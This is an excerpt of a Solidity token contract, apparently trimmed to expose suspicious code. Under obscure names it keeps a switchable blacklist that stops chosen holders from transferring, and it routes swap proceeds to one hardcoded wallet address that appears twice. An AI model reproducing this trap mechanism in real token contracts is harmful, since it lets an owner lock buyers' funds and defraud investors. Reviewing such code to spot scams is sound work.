...
contract sourcecode is Context, IERC20, Ownable {
    ...
    uint256 private _totalSupply = 4900* 10**_decimals;

    uint256 public _maxTxAmount = 4900 * 10**_decimals; 

    uint256 public _walletMax = 4900* 10**_decimals;

    uint256 private minimumTokensBeforeSwap = 100 * 10**_decimals; 



    bool public xustatus = true;

    mapping (address => bool) public xubbstatus;
    ...
    address payable public marketingWalletAddress = payable(0x76B002062Ea405b07C999eFDA19D31C6C0BFE195);
    ...
    constructor () {
        ...
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_sellShare);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(xustatus){
            ...
            require(!xubbstatus[sender],"ERC20");    
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 amountBNBTeam = amountReceived.mul(_sellShare).div(totalBNBFee);
 ...
 address payable public tWAddress = payable(0x76B002062Ea405b07C999eFDA19D31C6C0BFE195);
